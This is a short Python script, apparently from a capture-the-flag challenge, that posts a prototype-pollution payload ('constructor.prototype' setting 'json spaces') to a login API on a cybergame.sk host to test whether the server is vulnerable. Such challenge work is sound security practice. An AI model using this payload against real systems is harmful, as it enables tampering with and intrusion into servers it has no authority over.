import requests
import json

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

payload = {
    "username": "admin",
    "password": "password",
    "constructor": {
        "prototype": {
            "json spaces": 4
        }
    }
}
r = requests.post(url, json=payload, headers=headers)
print(r.text)
